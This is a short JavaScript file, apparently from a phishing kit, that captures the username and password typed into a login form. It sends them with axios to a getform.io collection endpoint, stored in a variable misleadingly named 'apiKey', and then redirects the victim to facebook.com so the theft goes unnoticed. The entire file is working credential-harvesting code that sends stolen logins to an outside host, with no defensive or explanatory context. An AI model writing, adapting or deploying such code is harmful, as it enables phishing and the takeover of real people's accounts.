import axios from "axios";

const username = document.getElementById("username");
const password = document.getElementById("password");
const button = document.getElementById("submit");

const apiKey = "https://getform.io/f/ea19e7cc-f6c4-46bf-aab4-28be27b98ef5";
button.onclick = function () {
  const usernameData = username.value;
  const passwordData = password.value;

  const dataToSend = { username: usernameData, Puserlog: passwordData };

  axios.post(apiKey, dataToSend).then((response) => {
    if (response.status == 200) {
      // window.location.href = './success.html'
      window.location.replace("https://www.facebook.com/");
    }
  });
};
